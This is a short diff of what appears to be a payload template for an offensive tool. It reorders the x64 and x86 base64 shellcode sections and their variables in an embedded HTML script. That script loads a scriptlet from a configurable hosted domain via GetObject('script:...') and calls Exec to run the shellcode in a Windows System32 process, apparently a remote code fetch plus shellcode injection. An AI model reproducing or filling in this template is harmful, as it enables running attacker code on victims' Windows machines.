@@ -1,8 +1,8 @@
-[ShellCodex64]
+[ShellCodex86]
 value: notSet
 process: b64Encode
 
-[ShellCodex86]
+[ShellCodex64]
 value: notSet
 process: b64Encode
 
@@ -20,8 +20,8 @@ data:
 	<html>
 		<script>
 			var a = GetObject('script:${HostedDomain:value}/${HostedSct:value}');
-			var x64 = "${ShellCodex64:value}"
 			var x86 = "${ShellCodex86:value}"
+			var x64 = "${ShellCodex64:value}"
 			a.Exec(x86, x64, 'C:\\Windows\\System32\\${Process:value}');
 			close();
 		</script>
